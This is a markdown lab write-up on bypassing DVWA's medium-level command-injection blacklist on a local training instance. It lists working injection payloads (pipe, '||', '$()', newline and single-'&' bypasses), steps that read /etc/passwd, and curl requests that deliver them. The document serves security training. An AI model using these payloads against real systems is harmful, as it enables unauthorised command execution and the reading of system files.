# DVWA Command Injection — Medium Security

## URL
http://127.0.0.1:4280/vulnerabilities/exec/

## Source Code Behavior (Medium)
- Blacklist approach: removes `&&` and `;` from input
- `str_replace(array('&&', ';'), '', $target)`
- Other command operators NOT filtered

## Key Differences from Low
1. `&&` and `;` are stripped
2. `|`, `||`, backticks, and `$()` still work

## Working Payloads

### Pipe operator (not filtered)
```
127.0.0.1 | whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 | id
```

### OR operator (not filtered)
```
127.0.0.1 || whoami
```
Note: `||` only executes second command if first fails. Use invalid IP to trigger:
```
invalidip || whoami
```

### Command substitution (not filtered)
```
127.0.0.1 | $(whoami)
```

### Newline bypass
```
127.0.0.1
whoami
```
(URL-encoded: `127.0.0.1%0awhoami`)

### Bypass && filter with &
```
127.0.0.1 & whoami
```
Note: Single `&` backgrounds the first command, then runs second — NOT filtered

## Step-by-Step Exploitation
1. Enter `127.0.0.1; whoami` — fails (`;` stripped)
2. Enter `127.0.0.1 | whoami` — works, shows username
3. Enter `127.0.0.1 | cat /etc/passwd` — dumps passwd file

## curl Commands
```bash
# Pipe bypass
curl -X POST "http://127.0.0.1:4280/vulnerabilities/exec/" \
  -d "ip=127.0.0.1 | whoami&Submit=Submit" \
  -b "PHPSESSID=<session>;security=medium"

# Single ampersand bypass
curl -X POST "http://127.0.0.1:4280/vulnerabilities/exec/" \
  -d "ip=127.0.0.1 %26 whoami&Submit=Submit" \
  -b "PHPSESSID=<session>;security=medium"
```

## Notes
- Blacklist only removes 2 operators out of many
- `|` (pipe) is the easiest bypass
- Single `&` also works (different from `&&`)
